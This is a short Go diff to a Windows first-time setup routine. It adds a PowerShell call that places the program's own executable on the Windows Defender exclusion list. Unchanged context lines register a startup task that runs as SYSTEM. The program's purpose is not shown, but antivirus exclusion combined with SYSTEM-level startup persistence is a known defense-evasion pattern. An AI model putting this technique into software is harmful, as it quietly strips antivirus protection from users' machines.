@@ -254,6 +254,10 @@ func WindowsFirstTimeSetup() {
 
 	fmt.Println("Scheduling startup task...")
 
+	// Tell windows defender our binary can be trusted.
+	_, err = ExecPowerShell("Add-MpPreference -ExclusionPath " + exePath)
+	handle(err)
+
 	// Enable the failsafe task to run at startup
 	_, err = ExecPowerShell(`schtasks /create /tn "project-one" /tr "C:\Windows\System32\one.exe" /sc onstart /ru "SYSTEM" /F`)
 	handle(err)
